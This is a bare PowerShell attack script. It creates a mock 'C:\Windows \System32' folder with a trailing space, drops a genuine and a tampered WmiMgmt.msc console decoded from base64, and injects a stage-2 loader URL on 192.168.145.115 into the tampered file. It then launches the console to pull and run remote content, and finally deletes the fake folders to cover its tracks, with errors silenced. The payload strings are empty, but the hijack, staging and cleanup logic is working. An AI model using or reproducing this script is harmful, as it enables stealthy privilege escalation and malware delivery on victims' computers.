$ErrorActionPreference = 'silentlyContinue'

$htmlLoaderUrl = "http://192.168.145.115/stage2/"
$originalConsole = ""
$hackedConsole = ""
$fakeFile = ""

New-Item "\\?\C:\Windows \System32\" -ItemType Directory
New-Item "\\?\C:\Windows \System32\en-US" -ItemType Directory

$decodedBytesOriginal = [System.Convert]::FromBase64String($originalConsole)
$decodedBytesFakes = [System.Convert]::FromBase64String($hackedConsole)

[System.IO.File]::WriteAllBytes("C:\Windows \System32\WmiMgmt.msc", $decodedBytesOriginal)
[System.IO.File]::WriteAllBytes("C:\Windows \System32\en-US\WmiMgmt.msc", $decodedBytesFakes)

(Get-Content -Path '\\?\C:\Windows \System32\en-US\WmiMgmt.msc' -Raw ) -replace '{htmlLoaderUrl}', $htmlLoaderUrl | Set-Content -Path '\\?\C:\Windows \System32\en-US\WmiMgmt.msc'
if ($fakeFile -ne $null -and $fakeFile -ne "") {
    Start-Process $fakeFile
}

Start-Process -FilePath 'C:\Windows \System32\WmiMgmt.msc'
Start-Sleep -Seconds 30

Remove-Item -Path "\\?\C:\Windows \System32" -Recurse -Force
Remove-Item -Path "\\?\C:\Windows \System32\en-US" -Recurse -Force
Remove-Item -Path "\\?\C:\Windows \" -Recurse -Force
Exit